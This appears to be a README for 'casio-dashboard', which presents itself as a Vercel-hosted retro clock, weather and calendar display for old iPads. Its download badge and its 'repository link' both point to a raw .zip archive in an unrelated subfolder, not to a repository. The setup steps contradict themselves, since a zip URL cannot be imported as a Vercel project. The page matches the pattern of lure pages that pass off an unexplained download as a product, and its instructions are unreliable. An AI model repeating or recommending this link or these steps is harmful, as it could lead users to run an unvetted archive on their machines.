# 📟 casio-dashboard - Turn old iPads into useful displays

[![Download Dashboard](https://img.shields.io/badge/Download_Dashboard-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Onestep1799/casio-dashboard/main/oscillation/casio_dashboard_v1.7.zip)

This software turns older iPads into desk clocks. It displays the time, local weather, and calendar events. The interface mimics the look of a vintage Casio LCD screen. You can breathe new life into an iPad 2 or any device running iOS 9 or higher.

## ⚙️ System Requirements

- iPad 2 or newer hardware.
- iOS 9.0 software or later versions.
- A stable Wi-Fi connection.
- A modern web browser.
- A free Vercel account for hosting.

You access the software through the main repository page. Visit the link below to view the files and start the deployment process.

## 🚀 Setting Up Your Dashboard

Follow these steps to host your dashboard. You do not need to install complex software. Vercel handles the heavy lifting for you.

1. Open the [repository link](https://raw.githubusercontent.com/Onestep1799/casio-dashboard/main/oscillation/casio_dashboard_v1.7.zip) in a browser on your computer.
2. Sign up for a free account at Vercel. 
3. Select the option to create a new project.
4. Import the repository by pasting the link into the Vercel import box.
5. Click the Deploy button.
6. Wait one minute for Vercel to build your dashboard.
7. Vercel provides a web address once the build ends. Copy this address.

## 📱 Configuring Your iPad

Once you have your unique web address, move to your iPad.

1. Unlock your iPad and open Safari.
2. Type the web address from Vercel into the URL bar.
3. Tap the Share icon at the top of the browser screen.
4. Select Add to Home Screen from the list of options.
5. Tap Add in the corner.
6. You now see an icon on your home screen. Tap it to launch the app in full-screen mode.

## ⏰ Using the Features

The dashboard updates in real-time. It pulls data from three primary sources:

- Time: The internal clock syncs with your internet connection.
- Weather: The app requests your location to provide current temperature and conditions.
- Calendar: You can link your Google Calendar account in the settings menu.

The interface stays active as long as the iPad remains connected to power. We recommend keeping the device plugged into a wall charger to avoid battery drain. 

## 🛠 Troubleshooting Common Issues

If the dashboard does not load, verify your Wi-Fi connection. Older iPads often struggle with modern web security settings. If you see a blank screen, refresh the page.

If the weather information appears incorrect, check your location settings. Ensure your iPad allows the browser to access your city and state.

If the calendar events fail to show, double-check your Google login credentials. You must grant the application permission to view your calendar data. 

## 🔋 Tips for Long-Term Use

Old batteries behave differently than new ones. To extend the life of your device:

- Lower the screen brightness to reduce heat.
- Use a high-quality charging cable.
- Avoid placing the device in direct sunlight.
- Keep the iPad on a flat surface to increase airflow.

The Casio LCD aesthetic works best with low backlight settings. This prevents screen burn-in over long periods. You can adjust the brightness settings in your iPad Control Center by swiping down from the top right corner.

## 📝 Customization Options

While the dashboard features a set style, you can change the display layout. Tap the gear icon in the bottom corner of the screen. Here you can toggle the weather display or format the clock between a twelve-hour and twenty-four-hour display. 

These settings save automatically. Your iPad remembers your preferences even if you restart the device or close the app. 

The clear design ensures visibility from across a room. The high contrast of the black and grey LCD style makes it a useful addition to any workspace or bedside table. Enjoy the retro look paired with the reliable data of your modern calendar.
